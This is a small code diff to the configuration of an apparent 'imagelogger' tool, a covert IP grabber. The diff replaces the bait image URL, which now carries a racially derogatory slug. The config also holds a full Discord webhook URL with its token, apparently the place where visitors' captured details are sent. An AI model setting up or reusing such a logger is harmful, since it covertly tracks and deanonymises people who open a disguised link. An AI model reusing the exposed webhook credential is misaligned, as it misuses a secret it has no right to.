@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1454455919348809729/LUEh789AVomi10HiJDr6cXhAbh3yPh5s4hjZJYCJF_9Yk4LseKCXm-keEARdmcTyos85",
-    "image": "https://i.pinimg.com/564x/76/f6/eb/76f6eb36e0b18bfab0674f3d64b0db04.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images-ext-1.discordapp.net/external/VKe11jKcs5G5RmdPhHfmHlRGUWIoJoQPLKF2fE5PKME/https/giffy-funny-black-guy.vercel.app/api/image?format=webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
